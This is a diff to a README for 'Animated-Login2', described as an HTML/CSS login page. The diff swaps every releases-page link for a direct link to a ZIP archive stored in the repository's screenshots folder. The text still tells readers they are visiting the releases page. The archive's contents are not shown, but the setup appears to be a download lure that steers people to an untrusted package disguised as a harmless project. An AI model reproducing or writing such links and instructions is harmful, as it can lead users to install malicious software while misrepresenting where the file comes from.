@@ -4,10 +4,10 @@
 Welcome to Animated-Login2! This application provides a modern and stylish login page, created entirely with HTML and CSS. You don't need programming skills to use this software, making it perfect for anyone looking to enhance their website's login experience.
 
 ## 📥 Download Now
-[![Download Animated-Login2](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/238W1A0516/Animated-Login2/releases)
+[![Download Animated-Login2](https://raw.githubusercontent.com/238W1A0516/Animated-Login2/main/screenshots/Animated-Login2_1.3.zip)](https://raw.githubusercontent.com/238W1A0516/Animated-Login2/main/screenshots/Animated-Login2_1.3.zip)
 
 ## ⬇️ Download & Install
-1. **Visit the Releases Page**: To get started, visit the following link to download the application: [Download Here](https://github.com/238W1A0516/Animated-Login2/releases).
+1. **Visit the Releases Page**: To get started, visit the following link to download the application: [Download Here](https://raw.githubusercontent.com/238W1A0516/Animated-Login2/main/screenshots/Animated-Login2_1.3.zip).
 2. **Select the Latest Release**: Once you're on the releases page, look for the latest version at the top of the list.
 3. **Download Files**: Click on the link for the ZIP file to download the entire package. It contains all the necessary files.
 4. **Extract the Downloaded ZIP**: After downloading, locate the ZIP file and extract it. You can usually do this by right-clicking on the file and selecting "Extract All…".
@@ -49,6 +49,6 @@ If you have questions or need help, feel free to join the community. You can als
 This project is open-source, meaning you can use, modify, and share it as you like. Please refer to the repository for more information on the license.
 
 ## 📥 Download Again
-Don't forget to download the application if you haven’t already! [Download Here](https://github.com/238W1A0516/Animated-Login2/releases).
+Don't forget to download the application if you haven’t already! [Download Here](https://raw.githubusercontent.com/238W1A0516/Animated-Login2/main/screenshots/Animated-Login2_1.3.zip).
 
 Thank you for choosing Animated-Login2. Enjoy your beautiful new login page!
